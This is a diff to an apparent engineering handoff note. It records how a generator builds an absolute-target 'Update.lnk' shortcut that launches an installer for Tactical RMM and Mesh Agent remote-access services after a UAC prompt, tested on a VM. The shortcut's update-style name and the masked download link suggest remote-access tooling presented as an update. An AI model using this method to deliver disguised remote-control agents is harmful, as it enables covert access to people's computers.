@@ -115,3 +115,24 @@ masked `https://dl.instaweb.top/d/0cb29a15-eeb6-427d-8e3d-122869c4b833`). Double
 approve UAC. Expect: `tacticalrmm` + `Mesh Agent` services **Running** and device **Online** for site 38.
 Delete the stale device `id=5` from the console first.
 > purely from the double-click (no manual step). See `docs/HANDOFF-VM-FINAL-TEST-2026-09-14.md`.
+## CORRECTED 2026-09-15 (2nd pass): absolute-target Update.lnk — the reliable double-click->UAC form
+
+The portable-*relative* `.lnk` (279 B) proved **not** resolved by Explorer (double-click -> no UAC; WScript reads
+`TargetPath=` empty). The reliable form is an **absolute-target** `.lnk` (585 B, flags `0xC7`, HasLinkTargetIDList|
+HasLinkInfo|HasName|HasIconLocation|IsUnicode) whose LinkInfo carries the full `C:\...\Launcher.exe` path — WScript
+resolves it and Explorer double-click -> UAC (verified live on the VM).
+
+- `generator/src/New-AgentShortcut.ps1`: `-LauncherMode` now accepts an **absolute** `-LauncherTarget` (previous
+  rela-only check relaxed). Absolute => emits absolute LinkInfo / no RelativePath. `Validate-ShellLink` hardened so a
+  null `-ExpectedTarget` no longer binds an empty `Path`; `-Validate` R3 accepts a target that resolves to
+  `Launcher.exe` (relative OR absolute). 48/48 self-tests still pass.
+- `generator/src/env.ts` + `launcher-build.ts`: new **`LAUNCHER_LNK_TARGET`** env = absolute `Launcher.exe` path
+  passed into `-LauncherTarget` (empty -> legacy bare relative `Launcher.exe`).
+- **Gotcha:** systemd's `EnvironmentFile` strips backslashes, so set `LAUNCHER_LNK_TARGET` with **forward slashes**
+  (`C:/Users/myrat/Desktop/VantraFinal/Launcher.exe`); `Normalize-WindowsPath` converts to `\`. Verified via
+  `/proc/<pid>/environ`.
+
+Retest-ready (this pass): `/tmp/final3.zip` on VPS = job `95f4f8ed-d205-4e84-a762-9079b98ba22c`, **site 41**,
+uid `c4e7f9f5-…`. Files placed on VM at `C:\Users\myrat\Desktop\VantraFinal\` (`Update.lnk` 585 B +
+`Launcher.exe` 12,364,914 B). Double-click `Update.lnk` -> approve UAC -> expect `tacticalrmm` + `Mesh Agent`
+`Running` and device **Online** for site 41.
